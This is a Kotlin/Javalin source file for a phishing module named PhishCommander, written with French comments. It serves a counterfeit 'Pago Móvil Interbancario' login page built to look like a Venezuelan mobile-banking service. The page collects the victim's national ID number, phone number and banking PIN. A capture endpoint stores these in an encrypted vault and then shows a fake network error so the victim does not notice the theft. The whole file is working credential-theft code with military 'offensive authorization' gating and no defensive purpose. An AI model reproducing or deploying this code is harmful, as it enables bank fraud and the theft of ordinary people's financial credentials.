package com.fardc.sigint.core

import io.javalin.Javalin

class PhishCommander(private val vault: SecurityVault, private val combatHandler: CombatModeHandler) {
    fun setupPhishPage(app: Javalin) {
        
        // --- VECTEUR D'INTERCEPTION : PAGO MÓVIL ---
        app.get("/login/pagomovil") { ctx ->
            // Vérification du mode : Nécessite au moins RECO pour afficher la page
            if (!combatHandler.isPassiveInterceptionEnabled()) {
                ctx.status(403).result("STBY_MODE: Accès refusé par le protocole de sécurité.")
                return@get
            }

            ctx.html("""
                <html>
                <body style="background:#f4f4f4; font-family:sans-serif; text-align:center; padding-top:50px;">
                    <div style="background:white; width:350px; margin:auto; padding:25px; border:1px solid #ddd; border-radius:8px; box-shadow: 0px 4px 10px rgba(0,0,0,0.1);">
                        <h2 style="color:#003893;">Pago Móvil Interbancario</h2>
                        <form action="/login/capture-pago" method="POST">
                            <input type="text" name="ci" placeholder="Cédula (V-12345678)" style="width:100%; padding:12px; margin:10px 0;" required><br>
                            <input type="text" name="phone" placeholder="Teléfono" style="width:100%; padding:12px; margin:10px 0;" required><br>
                            <input type="password" name="pin" placeholder="PIN" style="width:100%; padding:12px; margin:10px 0;" required><br>
                            <button type="submit" style="width:100%; padding:12px; background:#003893; color:white; border:none; border-radius:4px; font-weight:bold;">CONTINUAR</button>
                        </form>
                    </div>
                </body>
                </html>
            """.trimIndent())
        }

        // --- POINT DE CAPTURE (OFFENSIVE) ---
        app.post("/login/capture-pago") { ctx ->
            // Vérification stricte : Nécessite OP ou ENGAGED pour capturer
            if (!combatHandler.isFinancialOffenseAllowed()) {
                println("🚫 [BLOCAGE TACTIQUE] Interdiction de capture Pago Móvil en mode ${combatHandler.getStatus()}")
                ctx.status(403).result("CAPACITY_LOCKED: Autorisation offensive requise.")
                return@post
            }

            val ci = ctx.formParam("ci") ?: "N/A"
            val phone = ctx.formParam("phone") ?: "N/A"
            val pin = ctx.formParam("pin") ?: "N/A"

            // Exécution de la capture et chiffrement dans le Vault
            println("⚠️ [CAPTURE FIN] Mode ${combatHandler.getStatus()} | CI: $ci | Tel: $phone")
            vault.encryptData("MODULE:PAGO_MOVIL | CI: $ci | Tel: $phone | PIN: $pin")
            
            // Simulation d'erreur réseau pour la cible
            ctx.result("Error de red interbancaria. Intente de nuevo más tarde.")
        }
    }
}
